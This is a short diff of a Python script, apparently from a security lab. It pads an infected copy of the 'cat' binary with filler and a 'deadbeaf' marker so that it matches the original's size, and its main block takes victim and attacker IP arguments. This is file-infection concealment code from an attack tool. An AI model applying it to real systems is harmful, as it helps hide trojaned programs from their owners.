@@ -60,13 +60,16 @@ def modify():
     cat_size = 43416
     infect = open('cat', 'rb')
     infect_size = getSize(infect)
+    infect.close()
 
+    infect = open('cat', 'a')
     concat = ''
-    enlarge_size = cat_size - infect_size - 9
+    enlarge_size = cat_size - infect_size - 8
     for i in range(enlarge_size):
         concat += 'a'
     concat += 'deadbeaf'
-    os.system('echo {} >> cat'.format(concat))
+    infect.write(concat)
+    infect.close()
 
 if __name__ == '__main__':
     victim_ip, attacker_ip, attacker_port = parse_arg() 
